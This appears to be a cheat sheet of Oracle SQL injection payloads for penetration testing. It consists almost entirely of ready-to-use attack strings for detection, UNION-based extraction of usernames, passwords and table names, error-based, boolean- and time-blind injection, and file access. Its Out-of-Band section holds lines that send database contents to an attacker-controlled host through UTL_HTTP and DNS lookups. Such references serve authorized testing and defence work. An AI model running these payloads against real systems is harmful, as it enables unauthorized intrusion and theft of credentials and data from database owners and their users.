# SQL Injection - Oracle

## Detection
```sql
' AND 1=1--
' AND 1=2--
' OR '1'='1
```

## Comment Syntax
```sql
--          # Single line
/* */       # Multi-line
```

## Version Detection
```sql
SELECT banner FROM v$version;
SELECT * FROM v$version WHERE banner LIKE 'Oracle%';
```

## Union-Based
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT username,password FROM all_users--
```

Oracle requires `FROM dual` for SELECT without table.

## Extract Data
```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT username,password FROM all_users--
```

## Error-Based
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))--
' AND (SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT banner FROM v$version WHERE rownum=1)||chr(62))) FROM dual) IS NOT NULL--
```

## Boolean-Blind
```sql
' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM dual)--
' AND (SELECT SUBSTR(banner,1,1) FROM v$version WHERE rownum=1)='O'--
```

## Time-Blind
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',10)--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual) IS NULL--
```

## Out-of-Band (OOB)
```sql
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))--
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com') FROM dual--
```

## Stacked Queries
Oracle typically does NOT support stacked queries via a single JDBC statement (unlike MySQL/MSSQL). Usually restricted to single query per statement.

## File/OS Interaction
```sql
-- Read via UTL_FILE (needs directory object + privilege)
SELECT UTL_FILE.FOPEN('DIR_NAME','file.txt','r') FROM dual;

-- Command exec (needs DBMS_SCHEDULER or Java stored procs with privilege)
```

## Privilege Escalation
```sql
-- Check current user privileges
SELECT * FROM session_privs;
SELECT * FROM user_role_privs;
```
